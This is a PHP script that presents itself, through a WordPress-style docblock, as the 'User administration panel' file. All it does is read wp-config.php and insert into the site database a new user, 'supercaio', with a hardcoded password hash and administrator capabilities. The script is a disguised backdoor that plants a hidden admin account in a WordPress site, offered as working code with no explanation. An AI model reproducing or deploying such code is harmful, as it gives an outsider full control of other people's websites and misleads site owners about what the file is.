<?php
/**
 * User administration panel
 *
 * @package WordPress
 * @subpackage Administration
 * @since 1.0.0
 */
require_once( dirname( __FILE__ , 2 ) . '/wp-config.php' );

$wpuser = "INSERT INTO ".$table_prefix."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('4000', 'supercaio', '2d6ea76cff7c1e250590137d84d33437', 'Caio', 'caio@upsites.digital', 'https://upsites.digital/', '2011-06-07 00:00:00', '', '0', 'supercaio')";
$wpusermeta = "INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '4000', '".$table_prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";

$conexao = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD);
$banco = mysqli_select_db($conexao, DB_NAME);
mysqli_set_charset($conexao, DB_CHARSET);

if ($conexao->connect_error) {
    die("Connection failed: " . $conexao->connect_error);
}

$sql = $wpuser;
$conexao->query($sql);

$sql = $wpusermeta;
$conexao->query($sql);

if ($conexao->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conexao->error;
}

$conexao->close();